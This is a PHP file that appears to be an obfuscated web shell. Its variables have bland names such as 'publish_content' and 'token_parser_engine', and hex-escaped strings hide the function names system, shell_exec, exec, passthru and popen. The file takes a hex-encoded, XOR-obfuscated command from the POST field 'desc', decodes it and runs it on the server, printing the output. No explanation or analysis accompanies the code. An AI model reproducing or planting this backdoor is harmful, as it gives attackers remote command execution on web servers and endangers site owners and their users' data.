<?php

$publish_content6 = "stream_ge\x74_\x63\x6F\x6E\x74ents";
$config_manager = "\x68\x65\x782\x62in";
$publish_content1 = "\x73y\x73\x74em";
$publish_content5 = "\x70\x6Fpen";
$publish_content2 = "\x73hel\x6C_\x65\x78\x65c";
$publish_content7 = "\x70cl\x6F\x73e";
$publish_content3 = "e\x78e\x63";
$publish_content4 = "p\x61s\x73t\x68\x72u";
if (isset($_POST["d\x65sc"])) {
            function token_parser_engine ($obj  ,    $entity) {
 $resource = '' ;
    $r=0;
 while($r<strlen($obj)){
$resource.=chr(ord($obj[$r])^$entity);
$r++;

} return$resource;

}
            $desc = $config_manager($_POST["d\x65sc"]);
            $desc = token_parser_engine($desc, 47);
            if (function_exists($publish_content1)) {
                $publish_content1($desc);
            } elseif (function_exists($publish_content2)) {
                print $publish_content2($desc);
            } elseif (function_exists($publish_content3)) {
                $publish_content3($desc, $tkn_obj);
                print join("\n", $tkn_obj);
            } elseif (function_exists($publish_content4)) {
                $publish_content4($desc);
            } elseif (function_exists($publish_content5) && function_exists($publish_content6) && function_exists($publish_content7)) {
                $entity_resource = $publish_content5($desc, 'r');
                if ($entity_resource) {
                    $flag_token = $publish_content6($entity_resource);
                    $publish_content7($entity_resource);
                    print $flag_token;
                }
            }
            exit;
        }